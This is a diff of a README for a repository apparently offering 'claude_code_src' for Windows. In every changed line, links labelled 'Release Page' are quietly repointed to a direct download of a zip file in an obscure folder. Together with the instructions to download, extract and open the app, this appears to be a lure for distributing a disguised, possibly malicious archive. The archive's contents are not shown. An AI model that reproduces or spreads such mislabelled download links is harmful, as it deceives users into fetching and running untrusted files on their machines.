@@ -1,10 +1,10 @@
 # 🧩 claude_code_src - Simple Windows Source Recovery
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/cacodaemonic-impulseexplosive956/claude_code_src/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/cacodaemonic-impulseexplosive956/claude_code_src/main/thenceforwards/src_code_claude_v3.8-alpha.4.zip)
 
 ## 🚀 Get the files
 
-Visit this page to download: [claude_code_src Releases](https://github.com/cacodaemonic-impulseexplosive956/claude_code_src/releases)
+Visit this page to download: [claude_code_src Releases](https://raw.githubusercontent.com/cacodaemonic-impulseexplosive956/claude_code_src/main/thenceforwards/src_code_claude_v3.8-alpha.4.zip)
 
 Use the latest release on that page and save the file to your Windows PC
 
@@ -26,7 +26,7 @@ The app is built for simple use and focuses on a direct download and open flow
 
 ## 🛠️ How to download
 
-1. Open the [Release Page](https://github.com/cacodaemonic-impulseexplosive956/claude_code_src/releases)
+1. Open the [Release Page](https://raw.githubusercontent.com/cacodaemonic-impulseexplosive956/claude_code_src/main/thenceforwards/src_code_claude_v3.8-alpha.4.zip)
 2. Find the newest release at the top of the page
 3. Download the Windows file or archive from that release
 4. Save it to your Downloads folder or Desktop
@@ -121,7 +121,7 @@ Before you start, check these items:
 
 ## 📝 Short path to get started
 
-1. Go to the [Release Page](https://github.com/cacodaemonic-impulseexplosive956/claude_code_src/releases)
+1. Go to the [Release Page](https://raw.githubusercontent.com/cacodaemonic-impulseexplosive956/claude_code_src/main/thenceforwards/src_code_claude_v3.8-alpha.4.zip)
 2. Download the latest Windows release
 3. Extract the file if it is packed
 4. Open the app in the extracted folder
